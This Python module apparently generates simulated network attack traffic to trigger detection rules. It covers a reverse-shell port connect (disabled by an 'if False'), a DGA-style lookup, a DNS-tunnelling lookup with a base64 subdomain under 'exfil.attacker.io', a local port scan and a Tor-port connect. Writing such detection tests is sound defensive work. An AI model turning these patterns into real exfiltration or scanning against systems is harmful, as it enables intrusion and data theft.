"""Network attack generators."""

import subprocess


def connect_reverse_shell(host: str = "127.0.0.1", port: int = 4444) -> subprocess.Popen:
    """TCP connect to a typical C2/reverse-shell port."""
    return subprocess.Popen(
        ["python3", "-c",
         f"import socket,time; s=socket.socket(); "
         f"s.settimeout(1); "
         f"s.connect(('{host}',{port})) if False else None; s.close()"],
        stderr=subprocess.DEVNULL,
    )


def connect_to_rfc1918_unusual_port(
    host: str = "192.168.100.200",
    port: int = 31337,
) -> subprocess.Popen:
    """Connect to a private IP on an unusual high port."""
    return subprocess.Popen(
        ["python3", "-c",
         f"import socket; s=socket.socket(); s.settimeout(0.5); "
         f"s.connect_ex(('{host}',{port})); s.close()"],
        stderr=subprocess.DEVNULL,
    )


def dns_dga_query(domain: str = "xf3k2mnbvqzr1.io") -> subprocess.Popen:
    """Resolve a high-entropy (DGA-like) domain."""
    return subprocess.Popen(
        ["python3", "-c",
         f"import socket; socket.getaddrinfo('{domain}', None)"],
        stderr=subprocess.DEVNULL,
    )


def dns_tunneling_query(
    domain: str = "aGVsbG8gd29ybGQ.exfil.attacker.io",
) -> subprocess.Popen:
    """Resolve a long base64-subdomain used for DNS tunnelling."""
    return subprocess.Popen(
        ["python3", "-c",
         f"import socket; socket.getaddrinfo('{domain}', None)"],
        stderr=subprocess.DEVNULL,
    )


def mass_port_scan(target: str = "127.0.0.1", ports: int = 50) -> subprocess.Popen:
    """Rapid sequential connect attempts — triggers port-scan rules."""
    scan_code = (
        "import socket\n"
        f"for p in range(1,{ports}+1):\n"
        "    s=socket.socket(); s.settimeout(0.01); s.connect_ex(('127.0.0.1',p)); s.close()\n"
    )
    return subprocess.Popen(["python3", "-c", scan_code], stderr=subprocess.DEVNULL)


def connect_tor_port(host: str = "127.0.0.1") -> subprocess.Popen:
    """Connect to Tor SOCKS port 9050 — triggers C2 / Tor-egress rules."""
    return subprocess.Popen(
        ["python3", "-c",
         f"import socket; s=socket.socket(); s.settimeout(0.5); "
         f"s.connect_ex(('{host}', 9050)); s.close()"],
        stderr=subprocess.DEVNULL,
    )
